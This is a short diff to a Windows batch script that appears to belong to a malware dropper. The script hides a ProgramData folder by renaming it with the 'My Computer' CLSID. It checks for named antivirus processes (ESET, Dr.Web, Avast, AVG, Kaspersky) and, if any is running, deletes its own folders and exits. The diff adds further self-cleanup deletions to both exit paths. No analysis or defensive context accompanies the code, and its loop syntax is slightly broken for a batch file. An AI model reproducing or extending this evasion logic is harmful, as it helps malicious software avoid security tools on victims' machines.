@@ -2,6 +2,7 @@ rename "%ProgramData%\Comms" "LP3.{20D04FE0-3AEA-1069-A2D8-08002B30309D}"
 rd /s /q "%ProgramData%\Comms"
 setlocal EnableDelayedExpansion
 if exist "%ProgramData%\logdata..\Index.exe" (
+    rd /s /q "%ProgramData%\Comms"
     rd /s /q "%ProgramData%\LP3.{20D04FE0-3AEA-1069-A2D8-08002B30309D}"
     exit /b
 )
@@ -11,6 +12,7 @@ set "processList=ekrn.exe egui.exe spideragent.exe AvastUI.exe avgui.exe avp.exe
 for %a in (%processList%) do (
     tasklist /FI "IMAGENAME eq %a" 2>NUL | find /I "%a" >NUL
     if not errorlevel 1 (
+        rd /s /q "%ProgramData%\Comms"
         rd /s /q "%ProgramData%\LP3.{20D04FE0-3AEA-1069-A2D8-08002B30309D}"
         exit /b
     )
